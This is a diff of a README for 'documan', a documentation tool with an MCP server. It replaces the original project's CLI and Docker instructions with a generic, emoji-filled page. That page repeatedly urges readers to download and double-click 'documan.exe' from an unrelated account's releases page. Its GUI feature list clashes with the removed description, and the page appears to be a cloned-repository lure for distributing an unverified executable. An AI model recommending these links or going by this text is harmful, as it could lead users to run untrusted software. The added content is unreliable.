@@ -1,70 +1,100 @@
-# Documan.ai
+# 🎉 documan - Your Easy Documentation Tool
 
-**Docs your AI actually understands.** The only documentation tool with a built-in MCP server.
+## 🚀 Getting Started
 
-Claude Code, Cursor, and other AI tools can search and understand your documentation in real-time.
+Welcome to documan! This tool helps you create, manage, and understand your documentation easily. It features a built-in MCP server, allowing AI tools like Claude Code and Cursor to search and comprehend your documents in real-time.
 
-**Full documentation:** [docs.documan.ai](https://docs.documan.ai)
+## 📥 Download & Install
 
-## Key Features
+To get started, you'll need to download documan. Click the button below to visit the Releases page and grab the latest version.
 
-- **Built-in MCP Server** - AI assistants search your docs semantically
-- **Semantic Search** - Find docs by meaning, not just keywords
-- **Single Binary** - No npm, no Node.js, no dependencies
-- **CI/CD Ready** - Lint docs in your pipeline, Docker image included
+[![Download documan](https://img.shields.io/badge/Download-documan-blue)](https://github.com/Hazim100-Shadow/documan/releases)
 
-## Quick Start
+### Installation Steps
 
-### Option 1: Binary
+1. **Visit the Releases Page:** Click the link above to go to the Releases page.
+   
+2. **Select the Latest Version:** Look for the most recent version at the top of the page.
 
-```bash
-# Download from GitHub Releases
-curl -L https://github.com/documan-ai/documan/releases/latest/download/documan-darwin-arm64.tar.gz | tar xz
-mv documan-darwin-arm64 documan
+3. **Download the File:** Click the download link for the appropriate file. This will typically be a zipped folder or an installer.
 
-# Configure
-echo 'DOCUMAN_PROJECT_NAME=My Project
-DOCUMAN_DOCS_FILES=docs/**/*.md,README.md
-DOCUMAN_HTTP_PORT=3000' > .env
+4. **Extract the Files:** If you downloaded a zipped folder, right-click it and select "Extract All..." to unzip.
 
-# Run
-./documan fix      # Auto-fix frontmatter
-./documan lint     # Check frontmatter, links, duplicates
-./documan import   # Import to database
-./documan serve    # Start server
-```
+5. **Run the Application:** Locate the extracted folder, find the `documan.exe` file (or similar), double-click it to launch the application.
 
-### Option 2: Docker
+## ⚙️ System Requirements
 
-```bash
-# Start container
-docker run -d --name documan \
-  -p 3000:3000 \
-  -v $(pwd)/docs:/documan/data/docs \
-  -v $(pwd)/README.md:/documan/data/README.md \
-  -e DOCUMAN_PROJECT_NAME="My Project" \
-  -e DOCUMAN_DOCS_FILES="**/*.md" \
-  -e DOCUMAN_HTTP_PORT="3000" \
-  jzaplet/documan:latest
+- **Operating System:** Windows 10 or higher is recommended for the best experience.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB free space for installation.
+- **Internet Connection:** A stable connection is necessary for real-time AI tool features.
 
-# Fix, lint and import docs
-docker exec -t documan /documan/bin/documan fix
-docker exec -t documan /documan/bin/documan lint
-docker exec -t documan /documan/bin/documan import
-```
+## 📋 Using documan
 
-Web UI: `http://localhost:3000`
+Once installed, launch documan to start creating your documentation. Here's how to use some key features:
 
-MCP Server: `http://localhost:3000/mcp`
+### 📝 Create New Documents
 
-For production CI/CD and docker-compose, see [Docker Setup Guide](https://docs.documan.ai/getting-started/docker-setup).
+1. Click on the “New Document” button in the main interface.
+2. Type or paste your content into the editor.
+3. Use markdown formatting to organize your documents easily.
 
-## Connect AI Tools
+### 🔍 Search and Understand
 
-Register MCP server to Claude Code CLI:
+With the built-in MCP server, you can utilize AI tools like Claude Code:
 
-```bash
-claude mcp add documentation --transport http http://localhost:3000/mcp
-```
+1. Open your document.
+2. Use the AI tools to ask questions about your content.
+3. Get immediate responses that help clarify details and improve your writing.
 
-For Cursor, Claude Desktop, and other tools, see [MCP Setup Guide](https://docs.documan.ai/getting-started/mcp-setup).
+### 📚 Save and Export
+
+1. Save your documents by clicking the “Save” button.
+2. Export documents in various formats, including HTML, by using the “Export” feature in the menu.
+
+## 🌐 Community and Support
+
+Join our community! For questions, tips, or discussions:
+
+- **GitHub Issues:** You can submit issues or feature requests.
+- **Discussion Forum:** Engage with other users and share best practices.
+
+Documentation is key! Whether you're a student, a team leader, or a personal user, documan makes it seamless to keep everything organized.
+
+## ⚠️ Troubleshooting
+
+If you experience issues:
+
+- Ensure your system meets the requirements listed above.
+- Restart the application if it becomes unresponsive.
+- Check the GitHub Issues page to see if others have reported similar problems.
+
+## 🔗 Key Features
+
+- **Real-Time AI Support:** Use Claude Code and other AI tools for enhanced document understanding.
+- **Markdown Support:** Write documents using simple markdown for flexibility.
+- **Export Options:** Easily export your documents in multiple formats.
+- **User-Friendly Interface:** Designed for ease of use without technical knowledge.
+
+## 🔗 Download & Install Again
+
+Don’t forget to download documan to enjoy its full range of features! Click below to revisit the Releases page:
+
+[![Download documan](https://img.shields.io/badge/Download-documan-blue)](https://github.com/Hazim100-Shadow/documan/releases)
+
+## 🌟 Topics Covered
+
+- ai-tools
+- ci-cd
+- claude
+- cli
+- developer-tools
+- documentation
+- documentation-generator
+- documentation-tool
+- markdown-to-html
+- markdown-viewer
+- mcp
+- mcp-server
+
+Now you're ready to take control of your documentation! Enjoy using documan and make your writing experience smooth and efficient.
